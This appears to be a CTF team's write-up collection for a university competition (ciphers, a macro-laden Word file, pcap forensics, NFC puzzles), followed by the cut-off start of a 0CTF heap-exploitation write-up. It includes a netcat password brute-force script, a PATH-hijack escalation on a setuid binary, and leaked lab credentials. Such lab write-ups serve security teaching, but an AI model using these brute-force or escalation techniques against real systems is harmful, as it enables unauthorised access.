Overflowing](#3500-reverse-engineering--overflowing)\n - [ ] [6000 WinDoge](#6000-reverse-engineering--windoge)\n\n### Web ###\n\n - [ ] [500 Subdomain](#500-web--subdomain)\n - [x] [2500 Internet.zip](#2500-web--internetzip)\n - [ ] [12000 The Donald](#12000-web--the-donald) (partially solved)\n\n---\n\n## 500 Crypto / s3cr3t c0d3z ##\n\n**Description**\n \n> Here's sum cOd3z, can u crak them?\n> \n> `ZmxhZ3t3b3dfc3VjaF9jaGFsbGVuZ2VfbWFueV9oYXJken0K`\n> \n> `fhpuNEbggraPunyyratr`\n> \n> Difficulty: Super Easy\n\n**Solution**\n\nThe first cipher is [Base-64](https://en.wikipedia.org/wiki/Base64):\n\n```bash\n$ base64 -D <<<\"ZmxhZ3t3b3dfc3VjaF9jaGFsbGVuZ2VfbWFueV9oYXJken0K\"\nflag{wow_such_challenge_many_hardz}\n```\n\nThe second cipher is [Rot13](http://rot13.org/):\n\n```bash\n$ tr a-zA-Z n-za-mN-ZA-M <<<\"fhpuNEbggraPunyyratr\"\nsuchARottenChallenge\n```\n\n## 800 Crypto / Flag Generator 5000 ##\n\n**Description**\n\n> Flag Generator 5000\n> \n> https://content.hecc.io/FlagGen5000/Flag%20Generator%205000\n> \n> Difficulty: Easy\n\n**Files provided**\n\n- [Flag Generator 5000](files/FlagGenerator5000)\n\n**Solution**\n\nN/A\n\n## 2500 Crypto / I LOVE BASS!!! ##\n\n**Description**\n\n> I LOVE BASS!!!\n> \n> Wubwubwubwubwubwub\n> \n> https://content.hecc.io/ILOVEBASS/bassline.wav\n> \n> Difficulty: Medium\n\n**Files provided**\n- [bassline.wav](files/bassline.wav)\n\n**Solution**\n\nWe can open the file in any sound editor and see that the left channel seems to oscillate up and down strangely:\n\n![](screens/bassline.png)\n\nIn fact, ignoring the oscillations representing the actual song, there are only two positions for the left channel. Up and down, or 1 and 0. It is a binary encoding and we can easily tell roughly what the length of one bit is.\n\nThe technique for both encryption and decryption is described [here](https://blog.benjojo.co.uk/post/encoding-data-into-dubstep-drops).\n\nIn fact, the default parameters used in the blog post suffice to decode the flag:\n\n`flag{fd3dc9-e4e7-375bda7}`\n\n## 2000 Crypto / Send^Receive ##\n\n**Description**\n\n> Send^Receive\n> \n> There's something on this box that's replying with some weird data...\n> \n> `send-receive.hecc.io`\n> \n> Difficulty: Medium\n\n**Solution**\n\nThe server sends back as many bytes as we give it. Given the challenge description (`Send^Receive`, i.e. `Send XOR Receive`), we can see that it XOR's its output stream with our input stream. This means we can simply send it a lot of zero bytes to get the original output (since `x XOR 0 = x` for any `x`).\n\n## 3000 Crypto / Seeded Sequence ##\n\n**Description**\n\n> Seeded Sequence\n> \n> This program will give you a flag if it sees 'fig' in binary in its output. Can you figure out what you need to give it?\n> \n> `seeded-sequence.hecc.io:8124`\n> \n> Difficulty: Hard\n\n**Solution**\n\n(TODO)\n\n## 2700 Exploit / Vulnerable ##\n\n**Description**\n\n> `vulnerable.hecc.io`\n> \n> Difficulty: Medium\n\n**Solution**\n\nN/A\n\n## 4300 Exploit / Imjur ##\n\n**Description**\n\n> Imjur\n> \n> There's a cool new website under construction at http://imjur.hecc.io and I don't think it's very secure.\n> \n> Difficulty: Hard\n\n**Solution**\n\n(TODO)\n\n## 4800 Forensics / SD Card ##\n\n**Description**\n\n> Ah shit, I deleted some of the files off my SD card. Can you recover them? Just don't look too closely at them...\n> \n> https://content.heccio/Forensics/PHOTOS.img\n> \n> Alternate: https://content.heccio/Forensics/PHOTOS.001\n> \n> Difficulty: Medium\n\n**Files provided**\n\n- [PHOTOS.img](files/PHOTOS.img.zip)\n\n**Solution**\n\n(TODO)\n\n## 1200 Forensics / Can you hear me? ##\n\n**Description**\n\n> Hello? Can you hear me?\n> \n> https://content.hecc.io/Can-you-hear-me/canyouhear_me.wav\n> \n> https://content.hecc.io/Can-you-hear-me/flags.zip\n> \n> Difficulty: Hard\n\n**Files provided**\n\n - [flags.zip](files/flags.zip)\n - [can_you_hear_me.wav](files/can_you_hear_me.wav)\n\n**Solution**\n\n**Note:** Not solved during the CTF.\n\nThe `wav` file contained a link to a YouTube video (https://www.youtube.com/watch?v=3M47zawD59Q). Subtracting this known audio from the file provided results in a (quietly) read out password for the zip file containing a git repository, which should contain the flag (perhaps after `git stash pop` or similar).\n\n## 6000 Forensics / Data Leak ##\n\n**Description**\n\n> One of our boxes is leaking out extremely sensitive flag data from multiple places, can you find out the contents of the leaks?\n> \n> `dataleak.hecc.io`\n> \n> Username: user Password: password\n> \n> Difficulty: Super Hard\n\n**Solution**\n\nN/A\n\n## 1000 Miscellaneous / Hacking the air ##\n\n**Description**\n\n> The wifi HECC ME looks like it could be cracked quite easily.\n> \n> Flag is the password!\n> \n> Difficulty: Easy\n\n**Solution**\n\n(TODO)\n\n## 1500 Miscellaneous / Language Matters (Palo Alto) ##\n\n**Description**\n\n> `https://content.hecc.io/Language-Matters/challenge.doc`\n> \n> Difficulty: Easy\n\n**Files provided**\n\n- [challenge.doc](files/challenge.doc)\n\n**Solution**\n\nOpening the file in Word doesn't reveal much except for:\n\n![](screens/what-you-got.png)\n\nIf we scroll further down, there is some 1pt white text hidden in the document as well:\n\n```\n-----BEGIN CERTIFICATE-----\nelVNCn5Ya15eb11EbllHb3BCWVFWeHFxdVRbXhARFQ==\n-----END CERTIFICATE-----\n```\n\nWord also immediately asks whether macros should be enabled. Well of course, what could go wrong!\n\nAnd that triggers an error, but also conveniently reveals the macro source code. A couple of the functions in the code are just to trigger another function called `a` upon opening the file:\n\n```vba\nSub Workbook_Open()\n    a\nEnd Sub\n\nSub AutoOpen()\n    a\nEnd Sub\n```\n\nThere is also a `Base64Decode` function which is interesting but it really does what its name would suggest, so there is not much need to look into it.\n\nThen there is a `Blah` function:\n\n```vba\nFunction Blah(ByVal sData As String, ByVal sKey As String) As String\n    Dim l As Long, i As Long, byIn() As Byte, byOut() As Byte, byKey() As Byte\n    byIn = sData\n    byOut = sData\n    byKey = sKey\n    l = LBound(byKey)\n    For i = LBound(byIn) To UBound(byIn) - 1 Step 2\n        byOut(i) = (byIn(i) Xor byKey(l))\n        l = l + 2\n        If l > UBound(byKey) Then l = LBound(byKey)\n    Next i\n    XorC = byOut\nEnd Function\n```\n\nIt takes some `data` and a `key`, both strings. The `key` is repeated over the length of the input `data`, and the output is just `data` XOR'd with the `key`. This is a simple XOR decryption function. The `l = l + 2` line suggests that the key characters are not used in the same order as they are given to the function, but this is misleading – Windows systems store strings using a wide character encoding, i.e. each character is 2 bytes. Assuming the `key` and `data` are not high Unicode characters, only XOR'ing the first byte of each wide character suffices for decryption. Additionally, the last line would suggest the function was originally called `XorC`, then renamed to `Blah`.\n\nFinally, the actual `a` function, which is called upon opening the document:\n\n```vba\nSub a()\n    Dim s As String\n    x2 = Application.LanguageSettings.LanguageID(msoLanguageIDUI)\n    Set fso = CreateObject(\"Scripting.FileSystemObject\")\n    s = ActiveDocument.Content.Text\n    x = \"-----BEGIN CERTIFICATE-----\"\n    y = \"-----END CERTIFICATE-----\"\n    Z = InStr(s, x)\n    If Z > 0 Then\n        s = Mid(s, Z + Len(x))\n        s = Mid(s, 1, InStr(s, y) - 1)\n        s = Replace(s, \"-\", vbNullString)\n        s = Replace(s, vbCr, vbNullString)\n        s = Replace(s, vbLf, vbNullString)\n        \n        b1 = Base64Decode(s)\n        b2 = Blah(b1, x2)\n        \n        If InStr(1, b2, \"Key:\") = 1 Then\n            MsgBox b2\n        End If\n    End If\nEnd Sub\n```\n\nThe `LanguageID` call ([`LanguageSettings.LanguageID`](https://docs.microsoft.com/en-us/office/vba/api/office.languagesettings.languageid)) returns the language code identifier (LCID) of the user interface. The title of the challenge is \"language matters\", so we can assume this is an unknown..\n\nMost of the lines in the function then deal with getting the text content of the document, finding the hidden \"certificate\" bit, then extracting only the line between the two guards. This data (`elVNCn5Ya15eb11EbllHb3BCWVFWeHFxdVRbXhARFQ==`) is then Base-64 decoded, XOR decoded using the LCID obtained earlier. If the beginning of the result is `\"Key:\"`, a message box is displayed.\n\nAt this point we can simply assume the LCID is 4 characters long (since the function checks only 4 bytes for successful decryption). Due to the symmetry of the XOR cipher, we simply XOR the first 4 bytes of the ciphertext with the known plaintext to obtain the key:\n\n```bash\n$ echo \"elVNCn5Ya15eb11EbllHb3BCWVFWeHFxdVRbXhARFQ==\" | base64 -D | xxd\n0000000: 7a55 4d0a 7e58 6b5e 5e6f 5d44 6e59 476f  zUM.~Xk^^o]DnYGo\n0000010: 7042 5951 5678 7171 7554 5b5e 1011 15    pBYQVxqquT[^...\n```\n\n```python\n>>> \"\".join([ chr(ord(x) ^ y) for x, y in zip(\"Key:\", [0x7a, 0x55, 0x4d, 0x0a]) ])\n'1040'\n```\n\nSo the required LCID was `1040` ([corresponding to `0x410`, Italian](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lcid/70feba9f-294e-491e-b6eb-56532684c37f) probably).\n\nWith this we can also decrypt the whole flag:\n\n```python\n>>> \"\".join([ chr(ord(x) ^ y) for x, y in zip(\"10401040104010401040104010401040\", base64.b64decode(\"elVNCn5Ya15eb11EbllHb3BCWVFWeHFxdVRbXhARFQ==\")) ])\n'Key:Oh_no_it_is_ArmagHEADdon!!!'\n```\n\n`Oh_no_it_is_ArmagHEADdon!!!`\n\n## 2200 Miscellaneous / PreCTF ##\n\n**Description**\n\n> (This file was sent to the participants two weeks before the actual CTF, allowing us to solve it in our free time, then submit the flags during the CTF for points.)\n\n**Files provided**\n\n - [prectf.pcap](files/prectf.pcap)\n\n**Solution**\n\nThe `pcap` file contains a lot of interesting data. First, there are a number of FTP transfers. Of these, there is one of interest, a photo of a cat with green eyes. At the end of this file there is an embedded ZIP file, but it is password protected.\n\nIn the `pcap` there are also two VoIP calls. From these we hear somebody contacting a tech support line. The important information:\n\n - `sysjeff@hecc.io` - an (automated) e-mail address to contact to get credentials for servers\n - SSH login is the same as \"regular\" login\n\nAmong the HTTP requests, we can find some credentials:\n\n    /page.html?user=greg&password=eTiej1hahC4obaij\n\nWe can also find a number of IP addresses / hosts. We can connect to one of these using the credentials from the HTTP request to obtain the first flag.\n\nFrom the `history` listing on this SSH server, we find https://youtube.com/watch?v=UFcGnIgxSBk - a sequence of QR codes, put together they read `http://prectf.hecc.io/challenge17/staticfiles/whyisthisurlsolong/were-getting-there-now/almost/just/a/few/more/steps/thereweare.zip`. The ZIP file is password protected with the password `svXr8u2xdw`.\n\nAfter unzipping it contains `login.txt`:\n\n    competitor@challenge17.prectf.hecc.io\n    ho0ni6feiWodaegh\n\nThis SSH login leads to another flag, as well as an executable with the `set UID` bit set (escalating privilege). However, it uses `system(\"touch ...\")` (not `system(\"/usr/bin/touch ...\")`), which we can exploit, by creating our own `touch` script that gives shell and putting it in the `PATH`.\n\nWith higher privilege we can access the file `cat.txt`, which reads:\n\n    I hope you remember the green eyes\n    \n    iV2ci0OhdeehahV0\n\nThis is the password for the ZIP file extracted from the cat photo at the beginning. The extracted file reads:\n\n    wow, you did it!\n    email pre.ctf.i.win.yay@hecc.io for your flag!\n\nFor the final flag.\n\n## 4800 Miscellaneous / Kiosk ##\n\n**Description**\n\n> You've encountered a wild kiosk in the real world! Perhaps there's something else on it's local network...\n> \n> To do this challenge you will need VMWare Remote Console installed.\n> \n> Please then proceed to `https://kiosk.hecc.io/` for further instructions.\n>  \n> Difficulty: Super Hard\n\n**Solution**\n\nN/A\n\n## 400 Networking / Digging for Gold ##\n\n**Description**\n\n> Can you find anything interesting in the DNS of `hecc.io`\n> \n> Difficulty : Super Easy\n\n**Solution**\n\n(TODO)\n\n## 800 Networking / Free Token ##\n\n**Description**\n\n> You were given a flag when you joined the network.\n> \n> Difficulty: Easy\n\n**Solution**\n\n(TODO)\n\n## 800 Networking / Say please ##\n\n**Description**\n\n> Sometimes our DNS server breaks. Good thing we have `ns69.hecc.io` as a backup!\n> \n> Difficulty : Easy\n\n**Solution**\n\n(TODO)\n\n## 800 Networking / TAG! You're it! ##\n\n**Description**\n\n> Difficulty: Easy\n\n**Solution**\n\nCapturing traffic on the network with WireShark, we can see a UDP packet every now and then that contains a JPG image:\n\n![](files/udp.jpg)\n\n`flag{listen-at-the-right-time}`\n\n## 800 Networking / All of the lights! ##\n\n**Description**\n\n> If you listen carefully, you can hear the sounds of lights turning on and off.\n> \n> Difficulty: Medium\n\n**Solution**\n\nCapturing traffic on the network with WireShark, we can an odd protocol broadcasting the flag one character at a time.\n\n## 2500 Networking /  Pick up the phone! ##\n\n**Description**\n\n> Ring ring, Is that you on the phone? Why is nobody answering my calls :'(\n> \n> Difficulty: Medium\n\n**Solution**\n\nN/A\n\n## 1500 Networking / Miner ##\n\n**Description**\n\n> Our mining box is seeing even higher CPU usage than normal, and it's taken over all the ports... Can you find out what's going on?\n> \n> `miner.hecc.io`\n> \n> Difficulty: Medium\n\n**Solution**\n\nN/A\n\n## 3000 Networking / Flappy Boot ##\n\n**Description**\n\n> We used to use this box a lot for booting our machines, but something seems to have gone rather wrong with it.\n> \n> `flappy-boot.hecc.io`\n> \n> Difficulty: Hard\n\n**Solution**\n\nN/A\n\n## 5400 Networking / SecurEmessage 9000 ##\n\n**Description**\n\n> Hi Derek,\n> \n> I recently finished writing a super secure new voicemail system. This system uses secure claim codes which let you hear messages just once before they are deleted.\n> \n> Just dial `901` from any office phone, and enter your claim code to hear your secret message. I left one for you to test it out - claim it with `99*97*116*32*109*49`.\n>  \n> It's really been designed with security at heart, there's no way anyone can read any messages that aren't for them, let alone other files on the system! I hope we can push this to production ASAP.\n>  \n> Dave\n> \n> Hint: You'll need to connect to the SIP Server at:\n> \n> host:`asterisk.hecc.io`\n> user: `1234`\n> password: `supersecret`\n> Difficulty: Super Hard\n\n**Solution**\n\nN/A\n\n## 3000 Physical / NFC ##\n\n**Description**\n\n> What are those small tags on everyone's name badges? Could they hold a secret code?\n> \n> Difficulty: Hard\n\n**No files provided**\n\n**Solution**\n\nEach participant at the event was given a lanyard with a nametag. The back side of the tag had a small NFC chip. The contents of the NFC tags varied across nametags, but each university seemed to have the same variants. The context were printable text (although not really readable). Each variant started with a number.\n\nIn total, there were 6 versions, obtained by tag trading:\n\n```\n1 [!+[]+!+[]+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+\n2 []+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+\n3 []+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+\n4 [!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+\n5 []]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!\n6 +[]+!+[]+!+[]]+(![]+[])[+[]]\n```\n\nRemoving the numbers and concatenating the code:\n\n```javascript\n[!+[]+!+[]+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]\n```\n\nThis is actually obfuscated Javascript, obfuscated by a technique similar to [JSFuck](http://www.jsfuck.com/). The code can be executed as-is to produce the next part, but to understand it better, here it is reformatted a little bit:\n\n```javascript\n  [!+[]+!+[]+!+[]]\n+ [+[]]\n+ [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]\n+ [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]\n+ [!+[]+!+[]]\n+ (!![]+[])[!+[]+!+[]+!+[]]\n+ [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]\n+ [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]\n+ [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]\n+ [!+[]+!+[]+!+[]+!+[]+!+[]]\n+ [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]\n+ [!+[]+!+[]+!+[]]\n+ [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]\n+ [!+[]+!+[]+!+[]]\n+ [!+[]+!+[]]\n+ (!![]+[])[!+[]+!+[]+!+[]]\n+ [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]\n+ [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]\n+ [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]\n+ (![]+[])[+[]]\n```\n\nThe code is a sequence of string concatenations (`+` operators in the first column above). The majority of the component strings are simply numbers. These are formed using the `[!+[]+!+[]...]` sequences (or just `[+[]]` for `0`):\n\n```javascript\n[+[]] => [ 0 ]\n[!+[]+!+[]+!+[]] => [ 3 ]\n```\n\n(Stringification of one-element arrays simply stringifies the contained element.)\n\nThere are also a couple of letters, taken from the strings `'true'` and `'false'`, obtained with:\n\n```javascript\n(!![]+[]) => 'true'\n(![]+[]) => 'false'\n```\n\nSo the entire code evaluates to:\n\n`30682e686563632e696f`\n\nThis is in hexadecimal, decoded it reads:\n\n`0h.hecc.io`\n\nAfter navigating to the website, we were presented with a dancing crab video and a set of GPS coordinates, which turned out to be very close to the venue. After arriving at the location, another NFC tag was found with the content:\n\n```\nWell done! Hope you've enjoyed meeting new people!\n\nflag{but-wait-this-is-in-the-real-world!}\n```\n\n## 5300 Physical / Broken Codes ##\n\n**Description**\n\n> You may have seen some broken QR codes around the place, can you fix them?\n> \n> Difficulty: Hard\n\n**No files provided**\n\n**Solution**\n\nThree partially-censored QR codes could be seen around the venue.\n\n![](files/QR1.jpg)\n\nThe first scanned successfully without modifications.\n\n![](files/QR2.jpg)\n\n![](files/QR3.jpg)\n\nThe other two had to be clean in Photoshop:\n\n![](files/QR2-fix.jpg)\n\n![](files/QR3-fix.jpg)\n\n## 1000 Programming / Hulk Smash!! ##\n\n**Description**\n\n> Hulk SMASH? ANGRY, PASSWORD WRONG\n> \n> `hulk-smash.hecc.io`\n> \n> Difficulty: Easy\n\n**Solution**\n\nConnecting to the server, we can see that sending it almost anything results in it replying with `INCORRECT` and disconnecting:\n\n```bash\n$ nc Hulk-Smash.hecc.io 8124\nfoobar\nINCORRECT\n```\n\nWe can quickly do a manual check to see what happens when we send the server each character of the alphabet. For `a` through `e`, it replies with `INCORRECT` as expected, but when we send it `f` (and a newline), it doesn't reply at all. It only says `INCORRECT` once we send another character.\n\nSo from this it seems quite clear the server-side script accepts characters one-by-one, then closes the connection only when the last accepted character does not fit. This means we can \"brute force\" out the correct password, one character at a time, i.e. roughly 31 guesses per character on average (`26` lowercase letters, `26` uppercase letters, `10` digits, `1` underscore, average guess takes half the total number of characters if uniformly distributed).\n\n```bash\n#!/bin/bash\n\nflag=\"flag{\"\nwhile [[ true ]]; do\n    found=0\n    for char in _ {0..9} {a..z} {A..Z}; do\n        check=\"$flag$char\"\n        echo \"$check?\"\n        (printf \"$check\"; sleep 0.5) | nc Hulk-Smash.hecc.io 8124 | grep \"INCORRECT\" >/dev/null\n        if [[ \"$?\" -eq 1 ]]; then\n            found=1\n            flag=\"$check\"\n            echo \"$flag\"\n            break\n        fi\n    done\n    if [[ \"$found\" -eq 0 ]]; then\n        echo \"over?\"\n        break\n    fi\ndone\n```\n\n## 2500 Programming / Recursive (Palo Alto) ##\n\n**Description**\n\n> Recursive [PALO ALTO]\n> \n> Wow, that's a lot of encryption\n> \n> https://content.hecc.io/Recursive/challenge.py\n> \n> Difficulty: Easy\n\n**Files provided**\n\n- [challenge.py] - (TODO- add file)\n\n**Solution**\n\n**Files provided**\n\n - [recursive.py](files/recursive.py)\n\n**Note:** the file is unfortunately incomplete. It is missing a basic XOR encryption function, called `gasfewfesafds`.\n\n**Solution**\n\nThe script is fairly simple, except for a very long string in the middle:\n\n```python\nc0sns5mkcgvoebss = lambda c, e, f: c.decrypt(gasfewfesafds(bqetl6jxsj.b64decode(e), f))\nuylbditv = s6khpxxhxp.new(\"w6jxaeu7vnqozxnilyebatlimsaaiwq2\")\nc8p6a1=c0sns5mkcgvoebss(uylbditv, \"[REALLY LONG STRING HERE]\", \"mgvpqxkz\")\nexec(c8p6a1)\n```\n\nThe sequence of commands creates a new AES-256 decryption object, then gives it a Base-64-encoded + XOR-encrypted ciphertext. The result of the decryption is then executed using `exec`. As it turns out, simply replacing `exec` with `print` reveals that the encrypted script is basically the same as the original one, though it has different (garbage) variable names, and naturally the hidden string is slightly shorter.\n\nWith the title of the challenge and the general layout of the challenge it is easy to guess that the script we are actually looking for is nested in many layers of identical encryption.\n\nWe can write a script to match on the structure of the script as a string using regular expressions and perform the same decryption as long as possible:\n\n```python\nimport re\nfrom Crypto.Cipher import AES\nimport base64\n\ndef xor(message, key):\n    return bytes([ message[i] ^ ord(key[i % len(key)]) for i in range(len(message)) ])\n\nereg = re.compile(r\"\"\"[^ ]+ = lambda c, e, f: c\\.decrypt\\(gasfewfesafds\\(bqetl6jxsj\\.b64decode\\(e\\), f\\)\\)\n[^ ]+ = s6khpxxhxp\\.new\\(\"([^\"]+)\"\\)\n[^=]+=[^\\(]+\\([^,]+, \"([^\"]+)\", \"([^\"]+)\"\\)\nexec\\([^\\)]+\\)\n\t\t\"\"\")\n\nresult = ereg.match(open(\"recursive.py\", \"r\").read())\nwhile result:\n    print(result)\n\n    aesKey = result.group(1)\n    b64Data = result.group(2)\n    xorKey = result.group(3)\n\n    aesInput = xor(base64.b64decode(b64Data), xorKey)\n    aesDec = AES.new(bytes(aesKey, \"utf-8\"), AES.MODE_ECB).decrypt(aesInput)\n    result = ereg.match(aesDec.decode(\"utf-8\"))\n```\n\nAnd the final script is:\n\n```python\nexec(\"\"\"if 1==2: print \"Key: wubba_lubba_dub_dub \"\\nelse: print \"You fell into a pit and died... of dysentery.\"\n\"\"\")\n```\n\nAnother, simpler solution (not used during the CTF) would be to replace `exec` with a function which prints its input and then executes it.\n\n`wubba_lubba_dub_dub`\n\n## 1800 Reverse-Engineering / Defuse the Bomb! ##\n\n**Description**\n\n> Defuse the Bomb!\n> \n> IT\"S GOING TO GO OFF!!\n> \n> https://content/hecc.io/Defuse\n> \n> Difficulty: Medium\n\n**Files provided**\n\n\n**Solution**\n\n(TODO)\n\n## 3000 Reverse-Engineering / SharpCrypt ##\n\n**Description**\n\n> SharpCrypt\n> \n> Jon gave me a copy of his new software for encrypting files, it's missing some functionality though.\n> \n> https://content.hecc.io/SharpCrypt/\n> \n> Difficulty: Medium\n\n**Files provided**\n\n - [SharpCrypt.exe](files/SharpCrypt.exe)\n\n**Solution**\n\nN/A\n\n## 2500 Reverse-Engineering / Something's Missing ##\n\n**Description**\n\n> I can't quite place my finger on it, but something seems to be missing in the bash session on\n> `somethings-missing.hecc.io`\n> \n> Username: `user`\n> \n> Password: `password`\n> \n> Difficulty: Medium\n\n**Solution**\n\nUpon connecting to the server, we can `ls` our file, but see a strange gap in the listing:\n\n```bash\n> ls\ncat.jpg\n\nsomeotherfile\n> \n```\n\nLooking around the server more, we can see what shell is given to us on login in `/etc/passwd`. The \"shell\" turns out to be a simple wrapper for a regular shell, but it seems to be missing a line if we simply `cat` it.\n\nWe can easily read parts of the shell script with `head` and `tail`. It turns out the shell script filters out any lines containing the string `flag`.\n\nWith this knowledge we can tell that the misssing file in `ls` contains the word `flag`. We can use `cat *fla*` to read the file, but since it contains a flag in the format `flag{...}`, it will be filtered out. So, we use the `tail` trick again: `tail -c +4 *fla*`\n\n`flag{a9cd2896-4820-403b-b882-6c1d56698336}`\n\n## 2000 Reverse-Engineering / Treasure Island ##\n\n**Description**\n\n> YARRRRR!\n> \n> https://content.hecc.io/Treasure-Island/\n> \n> _NOTE: Binaries have the same function. Windows version is not fully tested._\n> \n> Difficulty: Medium\n\n**Solution**\n\n(TODO)\n\n## 3500 Reverse-Engineering / Overflowing ##\n\n**Description**\n\n> This box is practically _overflowing_\n> \n> `user@sh3llcod3.hecc.io`\n> \n> Ypu might find [this](https://content.hecc.io/Overflowing/) (https://content.hecc.io/Overflowing/) useful.\n> \n> The executable running was compiled... insecurely... It's also 32 Bit\n> \n> Difficulty: Hard\n\n**Files provided**\n\n - `Overflowing`\n\n**Solution**\n\nN/A\n\n## 6000 Reverse-Engineering / WinDoge ##\n\n**Description**\n\n> Our mad professor Denis has put together a spooky windows challenge. Can you figure out how to do it? We can't.\n> \n> A copy of the executable can be found here (without the flag):\n> \n> https://content.hecc.io/WinDoge/victim2/exe\n> \n> Try running your code against: `user@windoge.hecc.io`\n> \n> `password: password`\n> \n> Difficulty: Super Hard\n\n**Files provided**\n\n - WinDoge.exe\n\n**Solution**\n\nN/A\n\n## 500 Web / Subdomain ##\n\n**Description**\n\n> We have a server in the `hecc.io` domain for storing memes. It has it's very own SSL certificate. Can you find it's FQDN? [FQDN is the flag]\n> \n> Difficulty: Super Easy\n\n**Files provided**\n\n\n**Solution**\n\n(TODO)\n\n## 2500 Web / Internet.zip ##\n\n**Description**\n\n> Wait, you saved the _ENTIRE_ internet?!\n> \n> https://interent-zip.hecc.io/download.php\n> \n> Difficulty: Medium\n\n**Solution**\n\nIf we connect to the server, it starts sending us an actual file with `200000000000000` bytes (around `181 TiB`). The download speed is fast over Ethernet, but not fast enough, not to mention we don't carry around `200 TiB` drives in our laptops!\n\nThe data itself appears random and the actual HTTP response does contain `Content-Type: application/random`.\n\nBut since it is a modern Apache 2 server, we can nicely ask it for only a small part of the data using a [range request](https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests). Since there is only garbage at the beginning of the file, we can try to find out what is at the end.\n\n```\n$ printf \"GET / HTTP/1.1\\r\\nHost: Internet-zip.hecc.io\\r\\nConnection: close\\r\\nRange: bytes=199999999999000-200000000000000\\r\\n\\r\\n\" | nc Internet-zip.hecc.io 80 > out.bin\n```\n\nAnd indeed, we see:\n\n```\nHTTP/1.1 206 Partial Content\nDate: Sat, 09 Mar 2019 15:18:09 GMT\nServer: Apache/2.4.29 (Ubuntu)\nContent-disposition: attachment; filename=image.bin\nAccept-Ranges: bytes\nGAME: kek\nContent-Range: bytes 199999999999000-200000000000000/200000000000000\nContent-Length: 1000\nConnection: close\nContent-Type: application/random\n(some garbage data)\nflag{I_think_I_need_a_bigger_hdd}\n```\n\n`flag{I_think_I_need_a_bigger_hdd}`\n\n## 12000 Web / The Donald ##\n\n**Description**\n\n> \"Make America great again!\"\n> \n> I'm sure there's lots of ways to achieve that but I think starting here might be a good idea...\n> \n> http://the-donald.hecc.io\n> \n> Difficulty: Super Hard.\n\n**Solution**\n\n(TODO)\n", "timestamp": "2025-10-24T11:39:17.171498"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-03-23-0CTF-TCTF-Quals/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-03-23-0CTF-TCTF-Quals/README.md", "content": "## Plang\n\nThis is a challenge that I failed to solve during the contest since I've got into wrong direction. After contest I read [this](https://changochen.github.io/2019-03-23-0ctf-2019.html) and [this](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#plang) for some hints, and solved it in my own way.\n\n### Overview\n\nThe program is a mini JavaScript interpreter engine, with [grammar](grammar.md) given. The vulnerability is an array-out-of-bound when the index of array access is a negative `int32_t`. However, the PoC given does not produce signed extension when negative `uint32_t` is converted into 64-bit index to access the array element. Here is where I've got stuck: I tried to exploit the program with only such unsigned extension, but although this might work, the time needed is far more than `alarm` limitation. I might share my initial approach later. Therefore, the correct approach is to use negative index like this `a[-2] = 1`.\n\n### Data Structure Layout\n\n2 important data structures most useful for exploitation are `string` and `array`, let's see their memory layout.\n\nThis is **array**:\n\n```\npwndbg> x/40gx 0x55555578de90\n0x0000000000001040\t0x0000000000004010 // prev_size and size of ptmalloc chunk\n0x0000000000000004\t0x4000000000000000\n//each element is a `0x4` followed by a `double` floating point number\n//which is the numeric value of array element\n//`0x4` might be enum that specify this is a `double` type\n//there is no integer array element in this interpreter\n//in this example, the array is [2,2,2,2,...]\n0x0000000000000004\t0x4000000000000000\n0x0000000000000004\t0x4000000000000000\n//...\n```\n\nThis is **string**:\n\n```\nx/40gx 0x555555789610\n0x0000000000000830\t0x0000000000001030\n0x0000000000000005\t0x000055555577c120\n//there are some pointers that should not be changed\n0x0000555555788b00\t0x00001000f144edc5\n//0x00001000 is length of the string, \n//0xf144edc5 seems to be hash of the string\n0x3131313131313131\t0x3131313131313131\n0x3131313131313131\t0x3131313131313131\n//....\n```\n\n### Exploitation\n\nInitially I tried to allocate big chunks of string and array so that they will be allocated using `mmap` just 